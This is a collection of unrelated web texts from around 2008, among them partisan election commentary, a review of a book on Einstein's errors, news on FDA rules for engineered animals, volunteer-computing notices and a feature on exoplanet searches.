You ’ve chosen to turn your back on a good man , somewhat unproven perhaps , but surrounded by competent proven public servants and a man representing a proven , if flawed , political philosophy .
Instead you are choosing another man , doubtlessly good , but with health issues , with a wildly unqualified V.P. , surrounded by Roveite scoundrels and willing to put the country at the mercy of the flotsam and jetsam of past failed administrations .
This man you choose has proven in his campaign that he is ALREADY the puppet of the far - right and will continue to burden this country with policies that have repeatedly failed and have , indeed , resulted in the deaths of many of our fellow citizens .
Deaths that should never , ever have occurred .
It was a very easy choice to make .
Sure liberalism has its flaws , but conservatism , as it exists now in this country , is failure , complete failure on the grandest of scales .
Voting to have our country led by conservatives is indefensible .
I echo what Joe said , but I have one point of disagreement .
I think the Republicans of today do suck .
And it ’s not true conservatism that is the worst , for I am all for fiscal responsibility .
What truly sucks is the neo -Fascist , neo - conservatives of today who have usurped the Republican brand and turned it into a War Now , War There , War Always , borrow and spend to pay for perpetual war , terrorize our citizens , lie at every turn , fight every political battle to the death and take no prisoners ; and be damned the American populace mentality which oozes from the mouth of every one of these neo-conservatives , including the likes of Joe Lieberman .
They suck beyond words .
And joedugan , thank you for your words .
I remain blown away .
Editor note : I made a couple very small changes to Joe ’s words .
As fucking pissed as he is – and I am – at these fucking Republicans , I did n’t want the people who are fucking reading this to freak out over the word fucking .
I figure if you ’ve gotten this far , you ’re as fucking angry as we are .

Einstein ’s Mistakes
The Human Failings of Genius
Hans C. Ohanian
W.W. Norton : 394 pp. , $ 24.95

When Donald Crowhurst ’s abandoned sailboat was found adrift in the Atlantic in 1969 , his captain ’s log recorded the ravings of a man whose mind had snapped .
On page after page , he spouted fulminations and pseudoscience , finally ripping his chronometer from its mountings and throwing it and then himself into the drink .
During the voyage , an around - the - globe sailboat race , Crowhurst had been reading Einstein ’s book “ Relativity : The Special and the General Theory . ”
A chapter called “ On the Idea of Time in Physics ” seems to have pushed him over the edge .
Einstein was pondering what it means to say that two lightning bolts strike the ground simultaneously .
For this to be true , he suggested , someone positioned halfway between the events would have to observe the flashes occurring at the same instant .
That assumes that the two signals are traveling at the same speed -- a condition , Einstein wrote , rather oddly , that “ is in reality neither a supposition nor a hypothesis about the physical nature of light , but a stipulation which I can make of my own free will in order to arrive at a definition of simultaneity . ”
“ You ca n’t do THAT ! ” Crowhurst , an electrical engineer , protested to his journal .
“ I thought , ‘ the swindler . ’ ” From there he descended into madness .
Advertisement
Hans C. Ohanian , who tells this strange tale at the beginning of “ Einstein ’s Mistakes : The Human Failings of Genius , ” sympathizes with poor Crowhurst .
“ The speed of light is either constant or not , and only measurement can decide what it is , ” Ohanian writes .
For Einstein to make a postulation rather than propose it as a hypothesis to be tested may seem like a fine distinction .
( Earlier in his book , Einstein does cite an empirical basis for his assumption : the Dutch astronomer Willem de Sitter ’s paper , “ An Astronomical Proof for the Constancy of the Speed of Light , ” which was based on observations of binary stars . )
But to Ohanian , the act was as outrageous as when Indiana lawmakers tried to legislate the value for pi .
And so he adds it to his roster of Einstein ’s mistakes .
Ohanian , the author of physics textbooks and a former associate editor of the American Journal of Physics , sometimes seems to be overreaching in his attempt to humble the great man , but the book ’s quixotic approach -- retelling Einstein ’s story by homing in on his blunders -- makes for good intellectual entertainment .
Having read two books about Einstein just in the last year , I was n’t sure I could take another .
But with his idiosyncratic style and cranky asides ( at one point he calls the young Einstein “ an incorrigible and tactless loudmouth ” ) , Ohanian kept me eagerly turning the pages .
We have all heard that math was n’t Einstein ’s strong point , and Ohanian ruthlessly lays out the details .
A 12 - page marathon calculation in Einstein ’s doctoral dissertation , “ A New Determination of the Molecular Size , ” was “ a comedy of errors ” based on “ zany ” physical assumptions , such as treating sugar molecules dissolved in water as though they were tiny spheres sitting at rest instead of spinning like tops .
Advertisement
“ It is a total mystery why his thesis advisors overlooked this glaring mistake , ” Ohanian writes .
“ They were quite ordinary , dull professors at what was then a dull , second - rate university , but even the dullest of dull physics professors should not have been this blind .
Einstein ’s dissertation should have been rejected . ”
Fumbling ever forward , Einstein went on to commit more errors in the suite of famous papers he wrote in 1905 , what came to be called his miracle year .
The miracle , as Ohanian tells it , is that Einstein could have been wrong on so many details while coming through , in the end , with some of the greatest insights of the century .
In his paper on the photoelectric effect , for example , he claimed to prove that a phenomenon called blackbody radiation behaves like a gas made of light particles , or photons .
Not so fast , Ohanian objects :
Though the theory worked for high - frequency photons , Einstein glossed over the fact that it did n’t work for low - frequency ones , “ like a tailor who tells the customer how beautifully the jacket fits at the shoulders , and pretends not to notice that the sleeves are much too long , ending somewhere near the knees . ”
Most of the errors Ohanian describes will be just as esoteric for many readers , but his exasperated outbursts make the book fun .
E=mc2 ?
Do n’t get him started .
No matter what you have been told , it was not such an important equation , a trifle , really .
And not even original .
Nevertheless , in deriving the formula , Einstein left a hole in his argument “ almost big enough for a truck to drive through . ”
He proved the case for slow - moving bodies and then extrapolated , without justification , to fast - moving ones .
Advertisement
“ The mistake is the sort of thing every amateur mathematician knows to watch out for , ” Ohanian scolds .
Over the years , Einstein came up with more proofs ; they all contained errors .
Einstein buffs have read numerous times about what he called his “ biggest mistake ” ( introducing a fudge factor in general relativity to avoid the seeming absurdity of an expanding universe ) .
Ohanian gives us Einstein ’s “ zaniest mistake . ”
In trying to nail down the equivalence between energy and mass , he engaged in a mathematical fraud as egregious as that “ perpetrated by some sleazy Italian purveyors of olive oil , who pour a bottleful of genuine olive oil into a barrelful of vegetable oil of unknown provenance and then sell this mix as pure olive oil , extra vergine . ”
Sometimes , Einstein ’s friend Marcel Grossmann tried to help him with his figures but not always to good effect .
When Einstein was trying to get his mind around curved space - time , one of Grossmann ’s bungled equations led him astray .
Einstein did n’t notice .
“ In a performance worthy of Elmer Fudd marching off to hunt ‘ wabbits ’ and failing to notice that Bugs Bunny is sitting on top of his hunting cap , Einstein failed to recognize the mistake . ”
In going through Einstein ’s life , some of what Ohanian marks down as errors seem more like philosophical disputes .
Einstein ’s quest to find a unified theory and to expunge quantum craziness from physics ultimately failed .
But that does n’t mean it was n’t a noble attempt .
Ohanian assures us that his crankiness comes not out of schadenfreude , " [ b ] ut , rather , because these mistakes made Einstein appear so much more human .
They brought him down from the Olympian heights of his great discoveries to my own level , where I could imagine talking to him as a colleague , and maybe bluntly say , in the give - and - take of a friendly discussion among colleagues , ‘ Albert , now that is really stupid ! ’ ”
Advertisement
We can imagine Einstein responding favorably .
“ We all must from time to time make a sacrifice at the altar of stupidity , ” he once wrote to his colleague Max Born , “ for the entertainment of the deity and mankind . ”
Most important , Ohanian notes , Einstein ’s instincts were dead on .
Light is made of photons .
Mass is equivalent to energy .
Space - time is curved .
Nothing can exceed the speed of light .
Einstein , Ohanian writes , had “ a mystical intuitive approach to physics ” that led him to the right answers -- if not always by the right path .
Personal Quote :
[ on a new health care bill ] I hope that in the months ahead , we can join with colleagues on both sides of the aisle to arrive at a compromise solution that is acceptable to most of us , and serves the interests of Americans as best we can .
The Food and Drug Administration on Thursday opened the way for a bevy of genetically engineered salmon , cows and other animals to leap from the laboratory to the marketplace , unveiling an approval process that would treat the modified creatures like drugs .
The guidelines for the first time make explicit the regulatory hoops companies would have to jump through to sell engineered salmon that grow twice as fast as wild fish ; pigs with high levels of healthy omega - 3 fatty acids in their meat ; or goats that produce beneficial proteins , such as insulin , in their milk .
“ It ’s about time the federal government has acknowledged that these animals are on its doorstep and need to be regulated to ensure their safety , ” said Greg Jaffe , biotechnology director at the Center for Science in the Public Interest in Washington .
Many experts , however , say the proposed regulations may not go far enough to protect the public .
In particular , they argue that the approval process would be highly secretive to guard the commercial interests of the companies involved , and that the new rules do not place sufficient weight on the potential environmental effect of what many consider to be Frankenstein animals .

Animals can’t be treated exactly like drugs , said Jaydee Hanson , a policy analyst at the Center for Food Safety in Washington .
“ Drugs do n’t go out and breed with each other .
When a drug gets loose , you figure you can control it .
When a bull gets loose , it would be harder to corral . ”
The animals are genetically modified for a variety of purposes .
Some are designed to be more disease - resistant , such as the cow that is not susceptible to mad cow disease .
Others are more nutritious or grow faster , enhancing profits .
Researchers are considering modified animals as sources of organs for human transplants .
Advertisement
Another idea involves so - called biopharm animals , which would be used to produce drugs such as insulin .
“ There are very compelling and real benefits for humans and animals ” from genetic engineering , said William Flynn of the FDA ’s Center for Veterinary Medicine .
“ But we must show that they are safe before they enter the marketplace . ”
The new regulations do not cover cloned animals , most pets or research animals .
The FDA has already determined that clones -- genetic replicas -- are safe .
Pets and research animals are unlikely to enter the food chain .
Advertisement
Only one genetically engineered animal is now being sold in the United States , the glow - in - the - dark zebra fish for aquariums .
The FDA approved it because it is not eaten and its need for warm water effectively precludes its escape into the wild .
The first product likely to be sold under the new rules is a genetically engineered Atlantic salmon produced by Aqua Bounty Technologies Inc. of Waltham , Mass .
Inserted genes from two other fish allow it to reach full size in 18 months rather than the normal 30 .
Aqua Bounty , along with other biotechnology companies , has been pushing the FDA to establish guidelines and hopes to win approval next year .
Advertisement
Technically , it is not the modified animals but the added DNA segments that are considered drugs .
Realistically , however , the only way to regulate the property - changing DNA is to regulate the animal , said Eric Flamm , a policy advisor at the agency .
That regulation will require demonstration that the modified animal itself is healthy and that a food or drug produced from it is safe for human use .
The new rules do not envision feeding the products to humans in the equivalent of clinical trials for drugs .
Once an animal product has been approved , its labeling may or may not reflect its origin , the FDA said .
Advertisement
If the composition of meat or other food has been changed , such as by increasing its content of omega - 3 fats , that will be put on its label .
But if the animal simply grows faster or is more environmentally friendly without changes in composition , no mention of its genetically engineered origin is considered necessary .
The lack of labeling concerns consumer advocacy groups .
Jean Halloran , director of food policy initiatives at Consumers Union , called it “ incomprehensible . ”
“ Consumers have the right to know if the ham , bacon or pork chops they are buying . . . have been engineered with mouse genes , ” she said .

Interruption to CMS@Home , Wednesday 15th July
We need to interrupt the CMS project tomorrow to deploy a new Workflow Management Agent .
This means that jobs will not be available from sometime tonight .
We recommend that you set your CMS machines to No New Tasks as soon as possible , to avoid tasks terminating with an error if a job can't be fetched .
We anticipate jobs will be available again late Wednesday ( European time ) .
I 'll update this thread when it is OK to proceed .

CMS job rundown
We need to do some tests of a patch to fix a bug that 's been plaguing us for some time .
To this end , I am letting the job queues drain , so there will be an absence of CMS jobs -- perhaps as soon as tomorrow morning , depending on how we continue to recover from today 's Oracle quota problem .
So , be prepared to set No New Tasks as soon as you see any sign of lack of jobs -- or sooner if you prefer .
I do n't know how long the testing will take , there are many factors at work ( if the BOINC server sees that there are no jobs available , it will stop sending tasks ; that will mean it takes longer for each test batch to be recognised and start serving jobs ) .

Even I am a little shocked by this video from Palin 's church .
Asking God to protect her from witchcraft ?
Background on Muthee , the pastor , is here .
The AP story :
The video shows Palin standing before Bishop Thomas Muthee in the pulpit of the Wasilla Assembly of God church , holding her hands open as he asked Jesus Christ to keep her safe from " every form of witchcraft . "
" Come on , talk to God about this woman .
We declare , save her from Satan , " Muthee said as two attendants placed their hands on Palin 's shoulders .
" Make her way my God .
Bring finances her way even for the campaign in the name of Jesus .
...
Use her to turn this nation the other way around . "
Palin filed campaign papers a few months later , in October 2005 , and was elected governor the next year .
" Make her way my God .
Bring finances her way even for the campaign in the name of Jesus .
...
Use her to turn this nation the other way around . "
Palin filed campaign papers a few months later , in October 2005 , and was elected governor the next year .
Palin does not say anything on the video and keeps her head bowed throughout the blessing .
The Republican vice presidential candidate was baptized at the church but stopped attending regularly in 2002 .
A spokesman for the McCain campaign declined to comment .
A person who answered the phone at the Wasilla church confirmed the video was from May 2005 but declined further comment .
Sure they vetted her .
We want to hear what you think about this article .
Submit a letter to the editor or write to letters@theatlantic.com .
For indispensable reporting on the coronavirus crisis , the election , and more , subscribe to the Mother Jones Daily newsletter .
Last Thursday , during a McCain campaign town hall meeting in Denver , one participant stood up and challenged the GOP presidential candidate : “ When are you going to take the gloves off ? ”
His fellow McCain supporters in the downtown hotel roared with approval .
“ How about Tuesday night ? ” John McCain replied , referring to his second debate with Obama .
How about not ?
The McCain campaign in recent days has pumped up its effort to delegitimize Barack Obama , with its top strategist apparently calculating that McCain cannot vanquish Obama if the election is about issues .
At a recent rally in a California suburb , GOP vice presidential nominee Sarah Palin declared , “ Our opponent …is someone who sees America , it seems , as being so imperfect , imperfect enough , that he ’s palling around with terrorists who would target their own country . ”
( This was a reference to Obama ’s past association with Bill Ayers , the former Weather Underground radical who became an education expert ) .
And on Monday , McCain delivered a blistering attack on Obama that was loaded with inaccuracies and distortions .
So one expectation among the politerati was that McCain would continue swinging –or thrashing –at the second debate .
Work in Bill Ayers .
Refer to Jeremiah Wright .
Depict Obama as shifty and untrustworthy .
That did not happen .
McCain , trailing Obama in the polls , mainly trained his fire on policy matters .
He did continue to hurl misrepresentations at Obama .
( As the debate proceeded , I received 40 emails from the Obama campaign making this point . )
For instance , McCain once again claimed that Obama has voted 94 times to raise taxes , a charge that has been widely debunked by various factchecking outfits .
But there was no frontal assault on Obama ’s character–and only one or two slight digs on his qualifications .
The debate was more high - minded than anticipated .
But it demonstrated a tough reality for McCain : he is out of sync with his own campaign .
He cannot pull the trigger , when his advisers seem to believe a machine gun blast is needed .
Obama and his campaign are fully integrated .
He calls for a break from the past eight years on both domestic and foreign fronts and famously urges fundamental change .
As a new face–and a black man–he sure does represent change .
He is his message .
And his campaign for over a year and a half has not had to go through any strategic lurches or had to reconfigure either its candidate or its core pitch .
That ’s not true on the McCain side .
His campaign has been nothing but lurches .
And the most recent one –a turn toward even more negative campaigning –undercuts his old and now practically worn - out reputation as a straight - talking maverick .
So come Debate II , McCain was confronting a tough choice : damned if he does ( go negative ) and stalled if he does n’t .
Deciding to forego the nasty stuff , McCain relied on policy differences to hammer Obama .
The problem : Obama ’s policy prescriptions are not unpopular .
In response to the first question–posed by a member of the audience –Obama defended the Big Finance bailout bill , but he excoriated the “ failed economic policies ” of the Bush administration , tied McCain the Deregulator to said policies , blasted the corrupt chief execs of AIG , and called for a middle - class “ rescue package , ” involving tax cuts , health care reform , energy independence , and an infrastructure rebuilding plan .
That did n’t leave McCain much of an opening .
As he has done in the past , McCain tried to portray wasteful Washington spending as the main evil in the land .
His big news of the night was to propose that the federal government ought to buy up bad mortgages so people could keep their homes .
But for some reason , when McCain tried to appeal to Americans worrying about their economic security , he did n’t use the phrase “ middle class . ”
( McCain preferred to use a less engaging term : “ middle-income . ” )
McCain took a punch at Obama , a top recipient of contributions from Freddie Mac and Fannie Mae executives , for supposedly encouraging both institutions to make “ all these risky loans . ”
( Factcheckers , start your engines . )
Obama countered that McCain ’s own campaign manger , Rick Davis , had been a lobbyist for Freddie Mac.
McCain blasted earmark spending , noting that Obama had requested $ 3 million for a projector for a planetarium in Chicago .
Obama pushed back : earmark spending accounts for $ 18 billion a year , cutting back these requests is fine , but McCain wants to hand a $ 300 billion tax cut to corporations and wealthy individuals .
There was not much point scoring –certainly not for McCain who probably did , as the pundits said , need to make up ground .
When moderator Tom Brokaw asked each to say how they would prioritize health care reform , energy independence , and entitlement reform , McCain gave the standard political line : we can do them all at once .
Obama , looking decisive , said , energy had to come first , then health care .
And he placed education in his third spot .
In this exchange , he came across as the adult in the room .
When McCain derided Obama for being a tax raiser , Obama calmly and forcefully explained that he proposes to cut taxes for 95 percent of Americans and that only a small percentage of small business would be affected by the tax hikes he advocates for the well - off .
One of the most interesting –and perhaps telling –exchanges of the evening occurred when Lindsey Trella , an audience member , asked , “ Do you believe health care should be treated as a commodity ? ”
Obama went first and explained his proposal and made McCain ’s health care plan appear reckless :
If you ’ve got health care already , and probably the majority of you do , then you can keep your plan if you are satisfied with it .
You can keep your choice of doctor .
We ’re going to work with your employer to lower the cost of your premiums by up to $ 2,500 a year .
And we ’re going to do it by investing in prevention .
We ’re going to do it by making sure that we use information technology so that medical records are actually on computers instead of you filling forms out in triplicate when you go to the hospital .
That will reduce medical errors and reduce costs .
If you do n’t have health insurance , you ’re going to be able to buy the same kind of insurance that Sen.
McCain and I enjoy as federal employees .
Because there ’s a huge pool , we can drop the costs .
And nobody will be excluded for pre-existing conditions , which is a huge problem .
Now , Sen. McCain has a different kind of approach .
He says that he ’s going to give you a $ 5,000 tax credit .
What he does n’t tell you is that he is going to tax your employer - based health care benefits for the first time ever .
So what one hand giveth , the other hand taketh away .
He would also strip away the ability of states to provide some of the regulations on insurance companies to make sure you ’re not excluded for pre-existing conditions or your mammograms are covered or your maternity is covered .
And that is fundamentally the wrong way to go .
In fact , just today business organizations like the United States Chamber of Commerce , which generally are pretty supportive of Republicans , said that this would lead to the unraveling of the employer - based health care system .
That , I do n’t think , is the kind of change that we need .
McCain then explained his plan :
I want to give every American a $ 5,000 refundable tax credit .
They can take it anywhere , across state lines .
Why not ?
Do n’t we go across state lines when we purchase other things in America ?
Of course it ’s OK to go across state lines because in Arizona they may offer a better plan that suits you best than it does here in Tennessee .
And if you do the math , those people who have employer - based health benefits , if you put the tax on it and you have what ’s left over and you add $ 5,000 that you ’re going to get as a refundable tax credit , do the math , 95 percent of the American people will have increased funds to go out and buy the insurance of their choice and to shop around and to get — all of those people will be covered except for those who have these gold - plated Cadillac kinds of policies .
He did not effectively address Obama ’s criticism of his approach .
And when Brokaw asked the pair whether health care in America is “ a privilege , a right , or a responsibility , ” McCain went with “ a responsibility , ” adding , “ But government mandates , I–I ’m always a little nervous about that . ”
His was not an eloquent reply .
Obama then answered the question : “ I think it should be a right for every American .
In a country as wealthy as ours , for us to have people who are going bankrupt because they can’t pay their medical bills — for my mother to die of cancer at the age of 53 and have to spend the last months of her life in the hospital room arguing with insurance companies because they ’re saying that this may be a pre-existing condition and they do n’t have to pay her treatment , there ’s something fundamentally wrong about that . ”
Throughout this back and forth , Obama displayed a command of policy , and he also connected with anyone who has ever been pissed off with their health insurance company .
McCain seemed rooted in free - market ideology –which ai n’t looking so good these days .
On foreign policy issues , the discourse was a replay of the previous debate .
McCain hit Obama for having not supported the so - called surge in Iraq , claiming this demonstrated that Obama did not have the judgment to be commander in chief .
“ We do n’t have time for on - the - job training , my friends , ” McCain said .
Obama , though , gave no ground .
With some steel in his tone , he replied :
Well , you know , Sen. McCain , in the last debate and today , again , suggested that I do n’t understand .
It ’s true .
There are some things I do n’t understand .
I do n’t understand how we ended up invading a country that had nothing to do with 9/11 , while Osama Bin Laden and Al Qaeda are setting up base camps and safe havens to train terrorists to attack us .
That was Sen. McCain ’s judgment and it was the wrong judgment .
When Sen. McCain was cheerleading the president to go into Iraq , he suggested it was going to be quick and easy , we ’d be greeted as liberators .
That was the wrong judgment , and it ’s been costly to us .
Wrong on the surge versus wrong on the whole war ?
Clear advantage to neither .
Which is a loss for McCain , given that he ’s supposed to have an edge on national security matters .
And when McCain accused Obama of dangerously suggesting that the United States ought to be prepared to attack al Qaeda targets within Pakistan , Obama fought back : “ Sen. McCain suggests that somehow , you know , I ’m green behind the ears and , you know , I ’m just spouting off , and he ’s somber and responsible .
Sen. McCain , this is the guy who sang , “ Bomb , bomb , bomb Iran , ” who called for the annihilation of North Korea .
That I do n’t think is an example of speaking softly .
This is the person who , after we had — we had n’t even finished Afghanistan , where he said , “ Next up , Baghdad . ” McCain dismissed the “ Bomb , bomb , bomb Iran ” quip as “ joking with an old veteran friend , who joked with me about Iran . ”
For an evening billed as The Night McCain Attacks , Obama landed as many blows as did McCain .
Neither took any wild swings .
But Obama , leading in the polls nationally and within swing states , did n’t have to .
He is going smooth and steady .
He was practically cruising in this debate–slow and calm .
He exuded confidence .
McCain was no slouch .
He just could n’t overcome a high - performing foe .
In his final remarks , McCain talked mainly about himself :
I have spent my whole life serving this country .
I grew up in a family where my father was gone most of the time because he was at sea and doing our country ’s business .
My mother basically raised our family .
I know what it ’s like in dark times .
I know what it ’s like to have to fight to keep one ’s hope going through difficult times .
I know what it ’s like to rely on others for support and courage and love in tough times .
I know what it ’s like to have your comrades reach out to you and your neighbors and your fellow citizens and pick you up and put you back in the fight .
That ’s what America ’s all about .
I believe in this country .
I believe in its future .
I believe in its greatness .
It ’s been my great honor to serve it for many , many years .
And I ’m asking the American people to give me another opportunity and I ’ll rest on my record , but I ’ll also tell you , when times are tough , we need a steady hand at the tiller and the great honor of my life was to always put my country first .
It was a reference to his POW experience .
Nothing as explicit as his convention speech , which ended with a vivid description of that episode–but still it was John McCain talking about John McCain .
Obama ended the evening talking about what ’s going on :
The question in this election is : are we going to pass on that same American dream to the next generation ?
Over the last eight years , we ’ve seen that dream diminish .
Wages and incomes have gone down .
People have lost their health care or are going bankrupt because they get sick .
We ’ve got young people who have got the grades and the will and the drive to go to college , but they just do n’t have the money .
And we ca n’t expect that if we do the same things that we ’ve been doing over the last eight years , that somehow we are going to have a different outcome .
We need fundamental change .
That ’s what ’s at stake in this election .
That ’s the reason I decided to run for president , and I ’m hopeful that all of you are prepared to continue this extraordinary journey that we call America .
But we ’re going to have to have the courage and the sacrifice , the nerve to move in a new direction .
McCain offers a man ; Obama offers more .
For many voters , it ’s gotten rather frightening out there .
Perhaps frightening enough that the presidential race for them is not about which candidate is a proven hero but about which candidate best speaks to the challenges at hand .
( A CBS insta-poll after the debate found that among uncommitted voters , Obama won the debate 39 to 27 percent , with 35 percent calling it a draw . )
Obama is campaigning these days as if he senses that the times are on his side .
That was clear in the debate .
What was also clear was that McCain has to try another tact in the final debate next Wednesday .
He will need another lurch .
Publishers of technical software books and magazines seem to struggling against the relentless onslaught of the Internet , crushed between the twin rocks of rapidly changing technology and free online content .
In a recent .NET Rocks !
podcast , accomplished technical author Charles Petzold ( of Programming Windows fame ) discusses the grim commercial realities of writing technical software books in the 21st century .
It does n’t sound good .
His recent 3D programming for Windows book took 8 months to write and has sold less than 4,000 copies worldwide .
As he gets royalties of around $ 3 per copy sold ( less when sold outside the US ) , this equates to less than $ 12,000 for 8 months work .
He could have made around $ 9,000 flipping burgers for minimum wage over the same period [ 1 ] .
Ouch .
[ 1 ] Assuming 40 hours per week .
Gliese 876 is a modest star , just one - third the mass of our sun and only 15 light - years away , but it has a history - making planetary system all its own .
In 1998 a team led by Geoff Marcy of the University of California at Berkeley detected the first sign of something interesting there : a giant planet , twice the mass of Jupiter , circling Gliese 876 once every two months , its gravity yanking the star back and forth at the speed of a jet plane .
Three years later the same group found a second planet , half the mass of Jupiter and closer in , pulling the star around at the speed of a race car .
Although the planets are too faint to be seen directly , their motions cause the star ’s spectrum to wobble back and forth across the digital detector of an astronomical telescope .
In the past decade , announcements of Jupiter - size planets have become commonplace ; about 300 of them have been found so far .
In 2005 , however , with the help of improved detection software , Marcy ’s team turned up something else orbiting Gliese 876 — something truly new .
This invisible object added one more regular component to the star ’s motion , like the third note , faint and high , of a piano chord .
It was another planet , orbiting in just two days and pulling on the star much more gently , not at jet plane or race car speeds but at a speed a man could run .
This planet , dubbed Gliese 876 d , is clearly no Jupiter , Marcy realized .
It is no more than seven or eight times as massive as our own : a “ super - Earth . ”
Until then , all the known exoplanets ( planets circling other stars ) were big and gaseous , but this one is probably made of rocky materials — the first world like ours found in an alien solar system .
Gliese ’s super - Earth lies so close to its star that it has just about no chance of being inhabited .
If it has an atmosphere at all , it probably consists of dense steam , says Greg Laughlin of the University of California at Santa Cruz , a member of the discovery team .
But if we can find one rocky , Earth - like planet right in our galactic backyard , surely there must be many more .
Already , the Swiss astronomers who in 1995 discovered the first Jupiter - like exoplanet — and who are the great rivals of the California group in the exoplanet hunt — said in June that they had identified not one but three super - Earths orbiting a single star 40 light - years away .
The smallest is just four times as massive as Earth .
“ We ’ll find an Earth - mass planet by 2010 , ” Laughlin predicts , “ and an Earth - mass planet that ’s potentially habitable by 2012 . ”
And yet we still wo n’t have found a true second Earth .
The hallmark of Earth , after all , is not its mass , nor its rockiness , nor the fact that it is potentially habitable .
The hallmark is that it is actually inhabited .
These days , nobody doubts that there are other reasonably cool , rocky planets out there among the 100 billion stars in the Milky Way .
Everything astronomers have learned about how stars and planets form says there must be .
But is there life on any of those rocks , and if so , can we detect it ?
“ That ’s not going to happen from Earth , ” Laughlin says .
“ It has to happen from space . ”
In space , above our atmosphere , stars do not twinkle ; in space a telescope is also beyond day and night and can thus stare at the same star for weeks on end , gradually teasing from its light the barely perceptible but regular flickers caused by a small orbiting planet .
A French satellite called Corot , the first space telescope devoted primarily to looking for rocky planets , is in orbit now .
An even more capable American mission , Kepler , will be launched in April .
It is expected to find hundreds of Earths , including the first ones orbiting stars like the sun at distances like that of our own Earth .
Then , in 2013 , NASA will launch a giant infrared telescope called the James Webb Space Telescope .
An all - purpose observatory , the Webb was not designed to follow up on the discoveries of Corot and Kepler .
But if pushed to the limit , it just might be able to provide the first indication of life — a telltale molecule , such as oxygen , in the planet ’s atmosphere — on a super - Earth circling another star .
By 2014 headlines could be announcing the first tentative evidence of life beyond our solar system .
One rainy Tuesday afternoon last November , Annie Baglin , the chief scientist of Corot , sat at the window of a café near the Place Denfert - Rochereau in Paris , drinking tea .
It had not been an easy day .
French railway workers , striking over their retirement benefits , had shut down the commuter trains , preventing Baglin from reaching her office on the suburban campus of the Paris Observatory .
The railway workers and other civil servants were marching down the Boulevard Montparnasse , near Baglin ’s home , brandishing bright red flares that filled the air with chlorine - scented smoke ; off the boulevard , platoons of shield - toting , armor - wearing riot police stood nervously at the ready .
Arriving late for her rendezvous at the café , wearing the dark pink coat she had said would make her recognizable , Baglin explained that her car had been towed — apparently the traffic wardens were not on strike .
From the café Baglin would be proceeding to her dentist to have a tooth extracted .
On the plus side , her spacecraft was performing beautifully .
As Baglin launched ?
into the story of the little spacecraft that could , in principle , find many rocky planets , her high , thin voice sometimes disappeared into the noise of the sirens outside .
She is a shortish woman of 70 , with close - cropped gray hair and a warm , no -nonsense demeanor — her parents were both schoolteachers .
A brief profile of her on the Paris Observatory Web site is titled “ Annie Baglin — Never Say Die . ” Getting Corot to the launchpad , she explained , was a long , hard slog , marked by bureaucratic near - death experiences .
She never intended to be a planet hunter .
In the mid-1980s she and her colleagues proposed a space telescope to do stellar seismology — to study the inner workings of stars from vibrations on their surface , much as seismologists study Earth ’s interior by analyzing earthquakes .
The French and European space agencies were noncommittal about the idea .
Then came 1995 and the announcement of the discovery of the first exoplanet , by Michel Mayor and his colleagues at the Geneva Observatory .
Baglin and everyone else immediately realized that a spacecraft designed to detect the light fluctuations caused by starquakes might also be able to detect a planet .
Suddenly , Baglin says , “ we were very much sought after .
In hindsight , one can say that if it had n’t been for the discovery of exoplanets , we never would have been approved to do Corot .
That ’s what sold it . ”
Launched in December 2006 , Corot is thus a 1,300 - pound spacecraft that does two very different things .
No telescope yet exists that can take a picture of even a giant exoplanet ; astronomers compare the task to taking a picture of a firefly next to a searchlight thousands of miles away .
Mayor and his colleagues showed instead that it was possible , through a technique called astrometry , to detect the slight wobble in a star ’s light caused by the gravitational pull of an orbiting planet .
Most of the 300 - some exoplanets discovered since have been found that way .
But Corot relies on a different technique that has lately come to the fore in ground - based searches as well .
Called photometry , it detects the slight but regular dimming in a star ’s light when a planet transits in front of it .
What the search for planetary transits has in common with the observation of starquakes is the need to stare at the same stars for a long time — long enough to detect very slow vibrations or to detect at least three transits of a planet .
Otherwise , you ca n’t be sure it was really a starquake or a planet you saw , and not random fluctuations in the starlight .
Corot stares at the same spot in the sky for 150 days before switching to another .
“ Corot is Zen , ” Baglin says .
“ Once we ’re set up , we do n’t move .
We do n’t even breathe . ”
The spacecraft ’s 27 - centimeter ( 10.6 - inch ) telescope monitors up to 12,000 sunlike stars at once .
Getting a big sample is crucial because only one in a hundred of those stars that do have planets will be oriented so that the passage of the planet in front of the star is visible from Earth .
The precision of the telescope ’s measurements has exceeded its makers ’ hopes .
“ If Corot were to observe the million lightbulbs that shine along the Champs - Elysées at Christmas , ” said a press release from the Paris Observatory a few days before Christmas in 2007 , “ it would be able to detect whether a single bulb was flashing . ”
That parts - per-million sensitivity should allow Corot to detect the dips in a star ’s light caused by a transiting planet with a radius just twice that of Earth — and perhaps an even smaller one , provided its orbit is tighter than Mercury ’s , so that the planet completes three transits during the 150 - day viewing period .
Not long after the launch , the Corot science team , including Baglin , published a description of the mission .
It concluded with this prediction : “ The first confirmed terrestrial planets are expected in the spring of 2008 . ”
By last spring , however , the Corot team had announced only two new “ hot Jupiters ” and one unconfirmed super - Earth , with 40 more candidates in the pipeline .
Seeing transits is not enough ; periodic dips in a star ’s light could be caused by a small companion star too dim to detect directly .
To confirm a planet , Corot ’s candidates have to be observed from the ground using the wobble technique , which determines the mass of the transiting object ; a planet will be much lighter than a companion star .
But competition for telescope time on the ground is fierce , especially with so many planet hunters around .
“ It ’s a real bottleneck , ” Laughlin says .

Baglin has little patience for impatience or for the pressure on her to announce discoveries quickly .
“ Finding these things is n’t like finding the nose on your face ! ” she exclaimed , shortly before leaving the café last November to head for the dentist .
The Swiss astronomer Mayor gathered data for 20 years , she pointed out , before announcing his first exoplanet .
“ So when people tell me , ‘ You have n’t got any results , ’ when we ’ve only been in orbit for a year , I say , ‘ Stop !
Have mercy !’
In three years we ’ll have results indicating how common small planets are .
Big planets we know we ’re going to find .
We ’re looking for the little ones .
Are they there , or are n’t they ? ”
What about figuring out if one is inhabited ?
“ To me , that ’s not the big question , ” Baglin said .
“ Understanding the universe in its totality interests me more than looking for life on a planet like Earth around a star like the sun , which is the declared goal of our competitors .
That ’s not uninteresting , but it ’s not what excites me .
I find that very anthropomorphic . ”
Corot ’s competition is Kepler , and Baglin ’s is an astrophysicist named William Borucki at NASA ’s Ames Research Center in Mountain View , California .
In 1984 Borucki published his first description of the transit technique they would both end up using .
At that time Baglin was having her first glimmerings of what would become Corot but had no notion of looking for planets .
Nonetheless , Bag­lin , the planet hunter in spite of herself , beat Borucki into space with it .
Now he is nipping at her heels .
Kepler ’s bureaucratic history was even more tortured than Corot ’s , but the spacecraft is headed for launch on April 10 , 2009 , and astronomers are counting on it to settle the question of just how common Earths are — a result that will guide the whole future search for life in the universe .
Borucki well remembers the effect he had with that 1984 paper , published in the journal Icarus .
